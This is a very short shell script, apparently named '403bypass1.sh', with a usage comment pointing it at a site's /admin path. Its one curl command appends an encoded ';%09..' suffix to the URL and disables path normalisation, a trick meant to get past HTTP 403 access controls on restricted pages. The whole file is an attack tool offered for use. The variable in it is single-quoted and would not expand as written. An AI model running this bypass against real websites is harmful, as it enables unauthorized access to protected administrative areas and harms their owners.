# 
# Usp: 
# sh 403bypass1.sh  https://pagina.com/admin

curl -k -s -I --path-as-is -X GET '$1;%09..' -H 'User-Agent: Mozilla/5.0'
